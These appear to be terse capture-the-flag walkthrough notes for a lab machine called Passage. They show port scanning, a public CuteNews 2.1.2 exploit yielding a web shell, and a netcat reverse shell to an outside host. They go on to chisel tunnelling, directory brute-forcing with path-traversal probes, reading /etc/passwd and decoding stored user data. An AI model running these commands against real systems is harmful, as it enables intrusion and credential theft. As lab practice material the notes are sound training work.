`nmap -p- -sSCV 10.129.8.47  --min-rate 999`
``
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Passage News
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


http://10.129.8.47/CuteNews/ - Powered by [CuteNews 2.1.2](http://cutephp.com/cutenews/)

https://www.exploit-db.com/exploits/48800

` python3 48800.py`

```
Dropping to a SHELL
============================

command > id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`command > nc 10.10.16.47 4444 -e /bin/bash`

python -c 'import pty;pty.spawn("/bin/bash")'

tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -  


http://127.0.0.1:631/ru

www-data@passage:/tmp$ ./chisel server --port 8001
./chisel server --port 8001
2025/12/24 23:35:41 server: Fingerprint VpKvi02CiIzKHH9TU8tAy3v2siyLYiOkgC8seCljBo4=
2025/12/24 23:35:41 server: Listening on http://0.0.0.0:8001
2025/12/24 23:37:04 server: session#1: Client version (1.11.3-0kali1) differs from server version (1.11.3)
2025/12/24 23:37:11 server: session#2: Client version (1.11.3-0kali1) differs from server version (1.11.3)

└─$ chisel client 10.129.8.47:8001 631:localhost:631
2025/12/25 18:37:09 client: Connecting to ws://10.129.8.47:8001
2025/12/25 18:37:09 client: tun: proxy#631=>localhost:631: Listening
2025/12/25 18:37:10 client: Connected (Latency 91.189883ms)

`└─$ sudo dirsearch -u http://127.0.0.1:631  `
```
18:44:28] 200 -    2KB - /classes.jsp
[18:44:33] 200 -    2KB - /de
[18:44:36] 200 -    3KB - /es
[18:44:41] 200 -    3KB - /help
[18:44:41] 200 -    3KB - /help/
[18:44:41] 200 -    3KB - /help.htm
[18:44:41] 200 -    3KB - /helpadmin
[18:44:44] 200 -    2KB - /jobs
[18:45:02] 403 -  342B  - /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
[18:45:02] 403 -  342B  - /remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd
[18:45:03] 200 -  901B  - /robots.txt
[18:45:04] 200 -    3KB - /ru

```

`www/html/CuteNews/cdata/users$ cat /etc/passwd | grep bash`
<tml/CuteNews/cdata/users$ cat /etc/passwd | grep bash                       
root:x:0:0:root:/root:/bin/bash
nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash

`www-data@passage:/var/www/html/CuteNews/cdata/users$ cat 09.php`
cat 09.php
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319

`└─$ echo "YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319" | base64 -d`
a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}

